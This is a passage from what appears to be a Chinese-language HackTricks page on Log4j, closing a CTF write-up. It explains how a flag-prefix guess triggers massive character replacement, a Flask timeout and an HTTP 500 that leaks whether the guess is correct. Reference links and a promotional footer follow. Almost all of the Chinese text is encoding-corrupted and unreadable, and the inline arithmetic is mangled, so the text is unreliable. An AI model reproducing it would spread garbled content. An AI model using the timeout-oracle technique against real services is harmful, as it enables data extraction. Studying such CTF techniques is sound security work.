> å¦‚æœæ ‡å¿—ä»¥ `flagGuess` å¼€å¤´ï¼Œæ•´ä¸ªæ ‡å¿—å°†è¢«æ›¿æ¢ä¸º 29 ä¸ª `#`ï¼ˆæˆ‘ä½¿ç”¨è¿™ä¸ªå­—ç¬¦æ˜¯å› ä¸ºå®ƒå¾ˆå¯èƒ½ä¸æ˜¯æ ‡å¿—çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚**ç„¶åï¼Œå°†è¿™ 29 ä¸ª `#` ä¸­çš„æ¯ä¸€ä¸ªæ›¿æ¢ä¸º 54 ä¸ª `#`**ã€‚è¿™ä¸ªè¿‡ç¨‹é‡å¤è¿›è¡Œ **6 æ¬¡**ï¼Œæ€»å…±äº§ç”Ÿäº† ` 29*54*54^6* =`` `` `**`96816014208`  `#`**ï¼
>
> æ›¿æ¢è¿™ä¹ˆå¤šçš„ `#` å°†è§¦å‘ Flask åº”ç”¨ç¨‹åºçš„ 10 ç§’è¶…æ—¶ï¼Œè¿›è€Œå¯¼è‡´å‘ç”¨æˆ·å‘é€ HTTP çŠ¶æ€ç  500ã€‚ï¼ˆå¦‚æœæ ‡å¿—ä¸ä»¥ `flagGuess` å¼€å¤´ï¼Œæˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªé 500 çš„çŠ¶æ€ç ï¼‰

## å‚è€ƒèµ„æ–™

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­ **ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š** å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
